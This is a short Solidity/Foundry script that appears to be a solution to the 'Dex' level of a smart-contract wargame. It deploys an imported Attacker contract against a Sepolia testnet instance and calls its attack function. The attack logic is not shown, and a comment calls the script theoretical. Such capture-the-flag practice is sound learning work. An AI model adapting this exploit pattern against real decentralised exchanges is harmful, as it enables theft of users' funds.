// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Script.sol";
import "src/22_Dex/Level.sol";
import "src/22_Dex/Attacker.sol";

contract DexScript is Script {
    function setUp() public {}

    //COMMANDS:
    //source .env 
    //forge script script/22_Dex.s.sol:DexScript --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
    function run() public {
        //This script is theoretical and won't work due to the game's constraints - the attack can only be executed by the player contract.
        uint256  deployerPrivateKey = vm.envUint("SEPOLIA_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);  
        Dex target = Dex(0xBDcD624f5eBDBD176998e1fd1612ACcf3C26715D); // Change with your instance
        Attacker attacker = new Attacker(address(target));
        attacker.attack();
        }
}